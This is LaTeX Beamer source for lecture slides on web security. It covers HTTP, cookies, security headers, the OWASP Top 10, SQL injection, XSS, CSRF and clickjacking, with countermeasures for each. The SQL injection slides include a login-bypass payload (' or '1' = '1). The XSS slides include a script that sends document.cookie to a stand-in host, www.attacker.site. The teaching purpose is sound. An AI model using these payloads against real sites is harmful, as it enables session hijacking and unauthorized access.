\documentclass{beamer}
%\documentclass[handout]{beamer}

\usepackage[english]{babel}
\usepackage[latin1]{inputenc}
% Or whatever. Note that the encoding and the font should match. If T1
% does not look nice, try deleting the line with the fontenc.
\usepackage{times}
\usepackage[T1]{fontenc}
\usepackage{adbcolor}
% \usepackage{epsf}
% \usepackage{epsfig}
\usepackage{version}
\usepackage{alltt}
\usepackage{url}
\usepackage{listings}

\include{macros}
\include{cover}


\title[Web Security]
{Web Security}

\begin{document}

\lstset{basicstyle=\small\ttfamily,mathescape=true,escapechar=!,backgroundcolor=\color{pink},frame=single}

\lstdefinestyle{htmlCode} {
   language=html,
   basicstyle=\scriptsize\ttfamily,
   keywordstyle=\bfseries\ttfamily,
   commentstyle=\color{gray}\ttfamily,
   moredelim=**[is][\color{red}]{@}{@},
   escapechar=| % Escape to LaTeX between |...|
}
%% \section{Applied Web and Network Security}

\includeversion{printout}   % pick one
%\excludeversion{printout}

\begin{frame}
\titlepage
\end{frame}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\section{Motivation}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Motivation}
\begin{picture}(0,0)(0,0)
\put(200,-140){\includegraphics[scale=0.6]{fig/webappsec-P0}}
\end{picture}

According to a research of the Web\\
Application Security Consortium \cite{wasc2008}\\
\alert{over $90\%$ of online web applications\\
suffer from high risk level vulnerabilities!}\\[2ex]

The statistics includes data about\\
12,186 sites with 97,554 detected\\
vulnerabilities.

\end{slide}

\begin{slide}{Motivations (continued)}
Types of vulnerabilties and their distribution (according to \cite{wasc2008}):
\begin{center}
  \scalebox{0.45}{\includegraphics{fig/webappsec-P4}}
\end{center}
\end{slide}


\begin{slide}{Motivations (continued)}
  Effectiveness of automatic scanning tools vs black box and white box
  security assessments (according to \cite{wasc2008}):
\begin{center}
  \scalebox{0.5}{\includegraphics{fig/webappsec-P1}}
\end{center}
\end{slide}



%   \begin{minipage}[t]{.49\linewidth}
%     \begin{itemize}
%       \item Cross-site scripting (80\%).
%       \item SQL injection (62\%).
%       \item Parameter tampering (60\%).
%       \item Cookie poisoning (37\%).
%     \end{itemize}
%   \end{minipage}
%   \hfill
%   \begin{minipage}[t]{.49\linewidth}
%     \begin{itemize}
%       \item Database server (33\%).
%       \item Web server (23\%).
%       \item Buffer overflow (19\%).
%     \end{itemize}
%   \end{minipage}
% \end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{What is Web Security?}
  \begin{itemize}
    \item Web security is not as well-defined as e.g.\ cryptographic security.
    \item Practical web and network security depends on
      \begin{itemize}
        \item details of network standards, 
        \item implementation details,
        \item concrete versions of browsers and servers.
        \item \ldots
      \end{itemize}
    \item Attacks against privacy, security, \alert{and} quality of service.
%           (``safety'').
    \item Web and network security is a ``moving target''. 
    \item There is no ``once and forever'' solution.
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\section{HTTP in a Nutshell}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{HTTP in a Nutshell}
  \begin{figure}
   \centering\scalebox{0.4}{\includegraphics{fig/http}}
  \end{figure}
  \begin{itemize}
    \item HyperText Transfer Protocol (HTTP) is defined in RFC 2068.
    \item HTTP is an application level protocol.
    \item HTTP transfers hypertext requests and information between server 
          and browsers.
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{HTTP: The Client Side}
  \begin{itemize}\itemsep=2ex
    \item The client initiates all communication:
    \begin{center}
      \begin{tabular}{l|l}
        \structure{Method} & \structure{Description}\\
        \hline
        GET     & request a web page\\ 
        HEAD    & request header of a web page\\
        PUT     & store a web page\\
        POST    & request with payload
      \end{tabular}
    \end{center}
    \item The user navigates trough URLs, e.g.\ 
          \url{http://www.ai-lab.it/}
    \item HTTP does not support sessions.
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{HTTP: The Server Side}
  \begin{itemize}\itemsep=1ex
    \item The server delivers data upon request of the client.
    \item Arbitrary data can be transferred (client takes care of
      processing).
    \item The data can be can be static (HTML pages, images, \ldots) or
     dynamic (i.e.~computed on demand by a web application)
   \item Scripting can occur on:
     \begin{itemize}
     \item Server-Side (e.g. perl, asp, jsp)
     \item Client-Side (javascript, flash, applets)
     \end{itemize}
   \item Data is posted to the application through HTTP methods, this
     data is processed by the relevant script and result returned to
     the user's browser
  \end{itemize}
\end{slide}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{HTTP: Three tier architecture}
    \begin{center}
      \scalebox{0.35}{\includegraphics{fig/3tier}}
    \end{center} 
\end{slide}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{HTTP: The Server Side}
    \begin{center}
      \scalebox{0.45}{\includegraphics{fig/webapp-server-side}}
    \end{center} 
\end{slide}

\begin{frame}[fragile]\frametitle{GET vs POST Requests}
  \begin{block}{GET Request}
\begin{verbatim}
GET /search.jsp?name=blah&type=1 HTTP/1.0
User-Agent: Mozilla/4.0 
Host: www.mywebsite.com 
Cookie: SESSIONID=2KDSU72H9GSA289
<CRLF>
\end{verbatim}
  \end{block}

  \begin{block}{POST Request}
\begin{verbatim}
POST /search.jsp HTTP/1.0
User-Agent: Mozilla/4.0 
Host: www.mywebsite.com 
Content-Length: 16
Cookie: SESSIONID=2KDSU72H9GSA289
<CRLF>
name=blah&type=1
<CRLF>
\end{verbatim}

\begin{picture}(0,0)(0,0)
\setbeamercolor{block title}{bg=red!60,fg=black}
\setbeamercolor{block body}{bg=red!30,fg=black}
\put(240,130){
  \begin{minipage}{.3\linewidth}\small
    \begin{block}{HTTP headers}
      Colon-separated name-value pairs in clear-text
      string format, terminated by a carriage return (CR) and line
      feed (LF) character sequence.
    \end{block}
  \end{minipage}
}
\end{picture}

\end{block}

\end{frame}

\begin{frame}
  \frametitle{HTTP GET and POST Requests}
  \begin{itemize}\itemsep=1.5ex
  \item GET exposes sensitive authentication information in the URL
    \begin{itemize}
    \item In Web Server and Proxy Server logs
    \item In the http referer header
    \item In Bookmarks/Favorites often emailed to others
    \end{itemize}
  \item POST places information in the body of the request and not the URL
  \item \alert{Enforce HTTPS POST For Sensitive Data Transport!}
  \end{itemize}
\end{frame}


\begin{frame}
  \frametitle{Security HTTP Response headers}
\small
  \begin{itemize}
  \item \texttt{X-Frame-Options} 'SAMEORIGIN' - allow framing on same domain. Set it to 'DENY' to deny framing at all or 'ALLOWALL' if you want to allow framing for all website.
  \item \texttt{X-XSS-Protection} '1; mode=block' - use XSS Auditor and block page if XSS attack is detected. Set it to '0;' if you want to switch XSS Auditor off (useful if response contents scripts from request parameters)
  \item \texttt{X-Content-Type-Options} 'nosniff' - stops the browser from guessing the MIME type of a file.
\item \texttt{X-Content-Security-Policy} - A powerful mechanism for controlling which sites certain content types can be loaded from
\item \texttt{Access-Control-Allow-Origin} - used to control which sites are allowed to bypass same origin policies and send cross-origin requests.
\item \texttt{Strict-Transport-Security} - used to control if the browser is allowed to only access a site over a secure connection
\item \texttt{Cache-Control} - used to control mandatory content caching rules
  \end{itemize}
\end{frame}

% \begin{frame}
%   \frametitle{X-XSS-Protection}
% Use the browser's built in XSS Auditor\\[1.5ex]
%   \begin{itemize}\itemsep=1.2ex
%   \item X-XSS-Protection: [0-1](; mode=block)?
%   \item X-XSS-Protection: 1; mode=block
%   \end{itemize}
% \end{frame}

% \begin{frame}
%   \frametitle{Content Security Policy}

%   \begin{itemize}
%   \item Anti-XSS W3C standard http://www.w3.org/TR/CSP/
%   \item Move all inline script and style into external files
%   \item Add the X-Content-Security-Policy response header to instruct the
%     browser that CSP is in use
%   \item Define a policy for the site regarding loading of content
%   \end{itemize}
% \end{frame}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\section{The Client Side}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{HTTP Header}
  \begin{itemize}\itemsep=1ex
    \item On each request, the client sends a \structure{HTTP header} to the 
          server.
    \item Normally headers are sent unencrypted.
    \item Headers contain information such as
    \begin{itemize}
      \item requested language,
      \item requested character encoding,
      \item used browser (and operating system),
      \item cookies,       
      \item \ldots
    \end{itemize}
    \item HTTPS sends headers encrypted.
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{HTTP Headers: Private Information}
\begin{itemize}\itemsep=2ex
\item HTTP headers can also contain ``private'' information, e.g.:
  \begin{itemize}\itemsep=1.5ex
  \item \texttt{FROM:} the users email address, critical due to user
    tracking and address harvesting (spam).
  \item \texttt{AUTHORIZATION:} contains \structure{authentication}
    information.\\
    (In HTTP, ``authorization'' \emph{means} ``authentication''!)
  \item \texttt{COOKIE:} a piece of data given to the client by the
    server, and returned by the client to the server in subsequent
    requests.
  \item \texttt{REFERER:} the page from which the client came,
    including search terms used in search engines.
  \end{itemize}
\item Combining information (e.g.\ \texttt{FROM}, \texttt{REFERER}, IP
  address) allows server providers already a reasonable tracking of
  the users behavior.
\end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Cookies}
  \begin{itemize}\itemsep=2ex
    \item Cookies were introduced to allow session management.
    \item The main idea is quite simple:
      \begin{itemize}\itemsep=1.5ex
      \item A server may, in any response, include a cookie.
      \item A client sends in every request the cookie back to the
        server.
      \item A cookie can contain any data (up to 4Kb).
      \item A cookie has a specified lifetime.
    \end{itemize}
  \item Cookies received lots of criticism for privacy reasons.
  \end{itemize}
\end{slide}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Cookies and Privacy}
  \begin{itemize}\itemsep=2ex
    % \item User tracking Information is valuable and can be sold!
    \item Cookies can be used to track users.
    \item Privacy is attacked from many sides:
    \begin{itemize}\itemsep=1.5ex
      \item Analyzing server logs. 
      \item Eavesdropping traffic (even encrypted headers are informative).
      \item Enforcing proxys (or application level firewalls), e.g.
        deployed by your ISP or employer.
      % \item the use ``web bugs'' for exchanging cookies. 
      \item Reveal ``browser logs'' (e.g. history) on the client side.
    \end{itemize} 
    \item Thus, cookies are only part of the game.
    \item Anyway, cookies should be considered as \alert{confidential}
      information!
    \item Cookies with very long lifetimes are suspicious!
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{printout}
\begin{slide}{HTTP: Authentication}
  HTTP supports two authentication modes:
  \begin{itemize}\itemsep=2ex
    \item \textbf{\structure{Basic authentication:}}
    \begin{itemize}\itemsep=1.5ex
      \item Login/password based. 
      \item Information is sent unencrypted.
      \item Credentials are sent on every request to the same realm.
      \item Supported by nearly all server/clients and thus widely used!
    \end{itemize}
    \item \textbf{\structure{Digest authentication:}}
    \begin{itemize}\itemsep=1.5ex
      \item Server sends nonce.
      \item Client hashes nonce based on login/password. 
      \item Client sends only cryptographic hash over the net.
      \item Seldom used.
    \end{itemize}
%   \item Use browser features for storing your login/password with
%     care!
  \end{itemize}
\end{slide}
\end{printout}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{General Considerations}
  \begin{itemize}\itemsep=2ex
    \item Be careful when using public web browsers. 
    \item Visited sites are stored
      \begin{itemize}\itemsep=1.5ex
      \item in the browsers history, 
      \item in the browsers cache,
      \item can also be revealed by auto-completion features.
    \end{itemize}
  \item Use the ``manage password'' feature with care.
  \item Many threats are caused by malicious active components \\
    (JavaScript, ActiveX, \ldots).
    % \item Browsing the web is not as harmless as it should be!
  \end{itemize}
  \end{slide}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\section{The Server Side}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{OWASP Top 10 Most Critical Web Application
    Security Risks}
  % \vspace{-1ex} \fbox{
% \begin{minipage}{.96\linewidth}
%   \centering
%   {\green \normalsize 
%     Software is generally created with functionallity at first in 
%     mind and with security as a distant second or third.}
% \end{minipage}}\hfill\\

\begin{picture}(0,0)(0,0)
\put(0,-80){\includegraphics[scale=0.5]{fig/owasp2010}}
\put(0,-150){\includegraphics[scale=0.5]{fig/owasp-logo}}
\end{picture}


\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{What have these threats in common?}
  \begin{itemize}\itemsep=2ex
    \item They attack neither cryptography nor authorization directly.
    \item They all exploit programming or configuration flaws.
    \item All of them are relatively easy to exploit. 
    \item They all can cause serious harm, 
    \begin{itemize}\itemsep=1.5ex
      \item either by revealing secret data,
      \item or by attacking quality of service.
    \end{itemize}
    \item They can only be prevented by well-designed systems.
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Unvalidated Input 1/2}
  \begin{itemize}\itemsep=2ex
    \item \structure{Note:}
    \begin{itemize}\itemsep=1ex
      \item Web applications use input from HTTP requests.
      \item Attackers can tamper any part of a HTTP request.
    \end{itemize}
    \item \structure{Main idea:} send unexpected data (content or amount). 
    \item Possible attacks include:
    \begin{itemize}\itemsep=1ex
      \item System command insertion.
      \item \alert<2>{SQL injection.}
      \item \alert<2>{Cross-Site Scripting (XSS).}
      \item \alert<2>{Cross-Site Request Forgery (XSRF).}
      \item \alert<2>{Clickjacking (XSRF).}
      \item Exploiting buffer overflows.
      \item Format string attacks.
      \item Cookies poisoning.
      \item Manipulating (hidden) form fields.
    \end{itemize}
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Unvalidated Input 2/2}
  \begin{itemize}\itemsep=1ex
    \item Many sites rely on client-side input validation (e.g. JavaScript).
    \item Ways to protect yourself: \\[1ex]
          \alert{validate input against a positive specification!}
    \begin{itemize}\itemsep=1ex
      \item Allowed character sets.
      \item Minimum and maximum length.
      \item Numeric ranges.
      \item Specific patterns.
    \end{itemize}
    \item Only \structure{server side input validation} can prevent these attacks.
    \item Applications firewalls can provide only some parameter validation.
    % \item These kind of attacks are becoming more likely!
  \end{itemize}
\end{slide}

%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Injection Flaws}
  \begin{itemize}\itemsep=2ex
    \item A special injection ``unvalidated  input'' attack.
    \item Attacker tries to inject commands to the back-end system.
    \item Back-end systems include:
    \begin{itemize}\itemsep=2ex
      \item the underlying operating system (system commands).
      \item the database servers (SQL commands).
      \item used scripting languages (e.g. Perl, Python).
    \end{itemize}
    \item The attacker tries to execute program code on the server system!
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{slide}{Injection Flaws: SQL Injection}
  \begin{itemize}\itemsep=1.5ex
    \item Assume a web application with a database back-end using:\\[1ex]
\fbox{
\begin{minipage}{.96\linewidth}
  \centering
  {\green \normalsize 
        SELECT * FROM users WHERE user='\emph{\$usr}' AND passwd='\emph{\$pwd}'
}\end{minipage}}
      \pause
   \item What happens if we ``choose'' the following value for \emph{\$pwd}: 

\fbox{
\begin{minipage}{.96\linewidth}
  \centering
  {\green \normalsize 
       ' or '1' = '1
}\end{minipage}} \pause
   \item We get\\[1ex]
\fbox{
\begin{minipage}{.96\linewidth}
  \centering
  {\green \normalsize 
       SELECT * FROM users WHERE user='\emph{\$usr}' AND 
       passwd='\alert{\textbf{' or '1' = '1}}'
}\end{minipage}} \pause
   \item As \textsf{\structure{'1' = '1'}} is valid, \alert{we will be authenticated!}
 \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{printout}
\begin{slide}{Preventing Injection Flaws}
  \begin{itemize}\itemsep=1.5ex
    \item Filter inputs (using a list of allowed inputs!).
    \item Avoid calling external interpreters.
    \item Choose safe calls to external systems. 
    \item For databases: prefer precomputed SQL statements.
    \item Check the return codes to detect attacks!
  \end{itemize}
\end{slide}
\end{printout}

\begin{frame}\frametitle{JavaScript}
\begin{itemize}\itemsep=1.5ex
\item Current version standardized as ECMA 357
\item Most popular scripting language on the Internet
  \begin{itemize}
  \item works with basically with all browsers
  \end{itemize}
\item Designed to add interactivity to HTML pages
  \begin{itemize}
  \item usually embedded directly into HTML pages (\url{<script>} tags)
  \item dynamically add elements to page
  \item can access elements of HTML page (DOM tree)
  \item can react to events
  \end{itemize}
\item JavaScript is a scripting language
    \begin{itemize}
    \item dynamic, weak typing
    \item interpreted language
    \item script executes on virtual machine in browser (with compilation)
    \end{itemize}  
\end{itemize}
\end{frame}

\begin{frame}[fragile]\frametitle{JavaScript}
\begin{lstlisting}[style=htmlCode] 
<HTML>
<HEAD>
<TITLE>First JavaScript Page</TITLE>
</HEAD>
<BODY>
<H1>First JavaScript Page</H1>
<SCRIPT TYPE="text/javascript">
 document.write("<HR>");
 document.write("Hello World Wide Web");
 document.write("<HR>");
</SCRIPT>
</BODY>
</HTML>
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]\frametitle{JavaScript}
\begin{lstlisting}[style=htmlCode] 
<HTML>
<H1>Extracting Document Info with JavaScript</H1>
<HR>
<SCRIPT TYPE="text/javascript">
function referringPage() {
 if (document.referrer.length == 0) {
  return("<I>none</I>");
  } else {
  return(document.referrer); }
 }
 document.writeln
   ("Document Info:\n" + "<UL>\n" +
    " <LI><B>URL:</B> " + document.location + "\n" +
    " <LI><B>Modification Date:</B> " + "\n" +
    document.lastModified + "\n" +
    " <LI><B>Title:</B> " + document.title + "\n" +
    " <LI><B>Referring page:</B> " + referringPage() + "\n" + "</UL>");
 document.writeln
   ("Browser Info:" + "\n" + "<UL>" + "\n" +
    " <LI><B>Name:</B> " + navigator.appName + "\n" +
    " <LI><B>Version:</B> " + navigator.appVersion + "\n" + "</UL>");
</SCRIPT>
<HR>
</HTML>
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]\frametitle{JavaScript: Accessing Forms}

  \begin{itemize}
  \item The \lstinline|document.forms| property contains an array of
    form entries contained in the document.
  \item As usual in JavaScript, named entries can be accessed via name
    instead of by number, plus named forms are automatically inserted
    as properties in the document object
  \end{itemize}

\begin{lstlisting}[style=htmlCode] 
var firstForm = document.forms[0];
// Assumes <FORM NAME="orders" ...>
var orderForm = document.forms["orders"];
// Assumes <FORM NAME="register" ...>
var registrationForm = document.register;
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]\frametitle{JavaScript: Accessing Elements within Forms}

  \begin{itemize}
  \item The Form object contains an elements property that holds an array of Element objects
\item You can retrieve form elements by number, by name from the array, or via the property name:
  \end{itemize}

\begin{lstlisting}[style=htmlCode] 
var firstElement = firstForm.elements[0];
// Assumes <INPUT ... NAME="quantity">
var quantityField = orderForm.elements["quantity"];
// Assumes <INPUT ... NAME="submitSchedule">
var submitButton = register.submitSchedule;
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]\frametitle{JavaScript: Storing and Examining Cookies}

  \begin{itemize}
\item Read it (all cookies in a single string) to access values
\begin{lstlisting}[style=htmlCode] 
document.writeln(document.cookie);
\end{lstlisting}
\item Set it (one cookie at a time) to store values
\begin{lstlisting}[style=htmlCode] 
document.cookie = "name1=val1";
document.cookie = "name2=val2; expires=Monday, 01-Dec-18 23:59:59 GMT";
document.cookie = "name3=val3; path=/test";
\end{lstlisting}
\item Delete (one cookie at a time)
\begin{lstlisting}[style=htmlCode] 
document.cookie = "name1=; expires=Thu, 01 Jan 1970 00:00:01 GMT;';  
\end{lstlisting}
\end{itemize}

\end{frame}

\begin{frame}\frametitle{JavaScript Security}
\begin{itemize}\itemsep=1.5ex
\item JavaScript sandbox
  \begin{itemize}
  \item no access to memory of other programs, file system, network
  \item only current document accessible
  \item might want to make exceptions
    for trusted code
  \end{itemize}
\item Basic policy for untrusted JavaScript code
  \begin{itemize}
  \item Same Origin Policy
  \end{itemize}
\end{itemize}
\end{frame}

\begin{frame}
  \frametitle{Same Origin Policy}

  \begin{itemize}
  \item Access is only granted to documents downloaded from the
    same site as the script
    \begin{itemize}
    \item prevents hostile script from tampering other pages in browser
    \item prevents script from snooping on input (passwords) to other
      windows
    \item verify (compare) URLs of target document and script that access
      resource
    \end{itemize}
  \end{itemize}
\end{frame}

\begin{frame}
  \frametitle{Same Origin Policy  -- Domain comparison}

  \begin{itemize}
    \item use last two tokens of URL? [ http://cedolini.personale.unige.it ]
    \item use everything except the first token? [ http://unige.it ]
  \item Thus, checks are very restrictive
    \begin{itemize}
    \item everything (including server name, port, and protocol) must match
    \item Note that the path part of the URL doesn't matter anything.
    \item These are from same origin:
      \begin{itemize}
      \item http://site.com
      \item http://site.com/
      \item http://site.com/my/page.html
      \end{itemize}
    \item These come from another origin:
      \begin{itemize}
        \item http://www.site.com (another domain)
        \item http://site.org (another domain)
        \item https://site.com (another protocol)
        \item http://site.com:8080 (another port)
        \end{itemize}
      \end{itemize}
    \end{itemize}
  \end{frame}


\begin{frame}[fragile]
  \frametitle{Cross-Site Scripting (XSS)}

  At the core of a traditional XSS attack lies a vulnerable script in
  a vulnerable site: the script reads part of the HTTP request and
  echoes it back to the response page, without first sanitizing it.

\vspace{1ex}
  Suppose this script is named \texttt{welcome.php} and its parameter
  is \texttt{name}.  It can be operated this way:
\begin{lstlisting}[style=htmlCode]
GET /welcome.php?name=$\tt\textcolor{red}{Joe\%20Hacker}$ HTTP/1.0
Host: www.vulnerable.site ... 
\end{lstlisting}
And the response would be: 
\begin{lstlisting}[style=htmlCode]
<HTML><Title>Welcome!</Title>
Hi $\tt\textcolor{red}{Joe~Hacker}$<BR>
Welcome to our system
... </HTML>
\end{lstlisting}
\end{frame}

\begin{frame}[fragile]
  \frametitle{Cross-Site Scripting (XSS) }

  \begin{itemize}
  \item How can this be abused? Well, the attacker manages to lure the
    victim client into clicking a link the attacker supplies to
    him/her.
%   \item This is a carefully and maliciously crafted link, which causes
%     the web browser of the victim to access the site
%     (www.vulnerable.site) and invoke the vulnerable script.
%   \item The data
%     to the script consists of a Javascript that accesses the cookies
%     the client browser has for www.vulnerable.site.
%   \item It is allowed, since the client browser "experiences" the
%     Javascript coming from www.vulnerable.site, and Javascript's
%     security model allows scripts arriving from a particular site to
%     access cookies belonging to that site.
  \item Such a link looks like:
\begin{lstlisting}[style=htmlCode]
http://www.vulnerable.site/welcome.php?
  name=@<script>alert(document.cookie)</script>@
\end{lstlisting}
  \item The victim, upon clicking the link, will generate a request to
    \lstinline{www.vulnerable.site}, as follows:
\begin{lstlisting}[style=htmlCode]
GET /welcome.php?name=
 @<script>alert(document.cookie)</script>@ HTTP/1.0
Host: www.vulnerable.site ...
\end{lstlisting}
\end{itemize}
\end{frame}

\begin{frame}[fragile]
  \frametitle{Cross-Site Scripting (XSS) }
  \begin{itemize}\itemsep=1ex
  \item The vulnerable site response would be:
\begin{lstlisting}[style=htmlCode]
<HTML> <Title>Welcome!</Title>
 Hi @<script>alert(document.cookie)</script>@ <BR>
 Welcome to our system
... </HTML>
\end{lstlisting}
\item The victim client's browser interprets this response as an HTML
  page containing a piece of Javascript code.
\item This is allowed, as the Javascript comes from
  \url{www.vulnerable.site}!
  \end{itemize}
\end{frame}

\begin{frame}[fragile]
  \frametitle{Cross-Site Scripting (XSS) }
  \begin{itemize}\itemsep=1.5ex
  \item A real attack would send these cookies to the attacker.
  \item For this, the attacker may erect a web site
    (\url{www.attacker.site}), and use a script to receive the
    cookies.
  \item Instead of popping up a window, the attacker would write code
    that accesses a URL at his/her own site (\url{www.attacker.site}),
    invoking a cookie reception script with a parameter being the
    stolen cookies.
  \item This way, the attacker can get the cookies from the
    \url{www.attacker.site} server.
  \end{itemize}
\end{frame}  

\begin{frame}[fragile]
  \frametitle{Cross-Site Scripting (XSS) }
\begin{itemize}
\item The malicious link would be:
\begin{small}
\begin{lstlisting}[style=htmlCode]
http://www.vulnerable.site/welcome.php?
  name=@<script>window.open(
                   "http://www.attacker.site/collect.php?cookie="
                    %2Bdocument.cookie)
        </script>@
\end{lstlisting}
\end{small}
\item And the response page would look like:
\begin{lstlisting}[style=htmlCode]
<HTML>
<Title>Welcome!</Title>
Hi
@<script>
 window.open(
  "http://www.attacker.site/collect.php?cookie="
  +document.cookie)
</script>@
<BR>
Welcome to our system
...
</HTML>
\end{lstlisting}
\end{itemize}
\end{frame}

\begin{frame}
  \frametitle{Bank's XSS Opportunity Seized by Fraudsters (2008)}
  Fraudsters sent phishing mails with\\
  a specially-crafted URL to inject\\
  a modified login form onto the bank's\\
  login page.

\begin{picture}(0,0)(0,0)
\put(200,-50){\includegraphics[scale=0.3]{fig/fideuram}}
\end{picture}

The vulnerable page was served over\\
SSL with a valid SSL certificate issued\\
to the bank.\\[1ex]

Nonetheless, the fraudsters have been\\
able to inject an IFRAME onto the login page which loads a modified
login form from a web server hosted in Taiwan.\\[1ex]

Source: \url{http://news.netcraft.com/archives/2008/01/08/italian_banks_xss_opportunity_seized_by_fraudsters.html}
\end{frame}

\begin{frame}[fragile]
  \frametitle{Cross-Site Scripting: Countermeasures}
\begin{itemize}
\item Validate untrusted input
\item Use \lstinline|X-XSS-Protection| HTTP Response header to activate the browser's built in XSS Auditor\\[1.5ex]
  \begin{itemize}\itemsep=1.2ex
  \item \lstinline|X-XSS-Protection: [0-1](; mode=block)?|
  \item \lstinline|X-XSS-Protection: 1; mode=block|
  \end{itemize}
\item Use \lstinline|X-Content-Security-Policy| HTTP Response header
  to instruct the browser that CSP is in use.
  \begin{itemize}
  \item Anti-XSS W3C standard http://www.w3.org/TR/CSP/
  \item Move all inline script and style into external files
  \item Define a policy for the site regarding loading of content
  \end{itemize}
\end{itemize}
\end{frame}

\begin{frame}\frametitle{Cross-Site Request Forgery}
Cross-Site Request Forgery (CSRF) is a type of attack that occurs when a malicious Web site, email, blog, instant message, or program causes a user's Web browser to perform an unwanted action on a trusted site for which the user is currently authenticated.

\vspace{2ex}
Prevention Measures That Do NOT Work:
\begin{itemize}
\item Using a Secret Cookie
\item Only Accepting POST Requests
\item Multi-Step Transactions
\item URL Rewriting
\end{itemize}

\end{frame}

\begin{frame}\frametitle{Cross-Site Request Forgery: Synchronizer Token Pattern}

\textbf{Goal:} Give the  application has strong control on whether the user actually intended to submit the desired requests. 

\vspace{1ex}
How?
\begin{itemize}
\item generate random ``challenge'' tokens that are associated
  with the user's current session.
\item challenge tokens are then
  inserted within the HTML forms and links associated with sensitive
  server-side operations.
\item When the user invokes these
  sensitive operations, the HTTP request must include the challenge
  token.
\item It is then the responsibility of the server application to
  verify the existence and correctness of this token.
\end{itemize}
\end{frame}

\begin{frame}\frametitle{Clickjacking}
Clickjacking (a subset of the "UI redressing") is a malicious technique that consists of deceiving a web user into interacting with something different to what the user believes she is interacting with. 

\begin{picture}(0,80)(0,0)
\put(0,-70){\includegraphics[scale=0.27]{600px-Clickjacking_description}}
\put(180,-40){\fbox{\includegraphics[scale=0.31]{600px-Masked_iframe}}}
\end{picture}

\end{frame}


\begin{frame}[fragile]\frametitle{Clickjacking: Countermeasures}
\begin{itemize}\itemsep=1.5ex
\item The \lstinline|X-Frame-Options| HTTP Response header protects from most classes of Clickjacking
\begin{itemize}
\item \lstinline|X-Frame-Options: DENY|
\item \lstinline|X-Frame-Options: SAMEORIGIN|
\item \lstinline|X-Frame-Options: ALLOW FROM|
\end{itemize}
\item Use \lstinline|frame-ancestors| directive in the \lstinline|X-Content-Security-Policy| HTTP response header.
\item \emph{Frame busting:} (for old browsers) include a "frame-breaker" script in each page that should not be framed. 
\end{itemize}

% \begin{picture}(0,100)(0,0)
% \put(190,-20){\includegraphics[scale=0.3]{clickjacking}}
% \end{picture}

\end{frame}



%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{printout}
\begin{slide}{Broken Access Control}
  \begin{itemize}\itemsep=1ex
    \item Reliable access control mechanisms are
    \begin{itemize}\itemsep=1ex
      \item difficult to implement.
      \item difficult to configure, setup and maintain.
    \end{itemize}
      \item Access control policy should be clearly documented.
      \item Rethink your requirements and scan your setup for:
    \begin{itemize}\itemsep=1.5ex
      \item Insecure IDs: is an attacker able to guess valid IDs?
      \item Forced browsing past access control checks: \\
            can a user simply access the protected area directly?
      \item Path traversal: take care of absolute and relative path names.
      \item File permissions.
      \item Client side caching.
    \end{itemize}
  \end{itemize}
\end{slide}
\end{printout}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
\begin{printout}
\begin{slide}{Broken~Authentication~and~Session~Management}
  \begin{itemize}\itemsep=2ex
  \item Authentication and session management include web pages for
    \begin{itemize}\itemsep=1.5ex
      \item changing passwords.
      \item handling of forgotten passwords.
      \item updating (personal) account data.
    \end{itemize}
    \item The complexity of such systems is often underestimated.
    \item An attacker can hijack a user's session and identity.
  \end{itemize}
\end{slide}
%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%
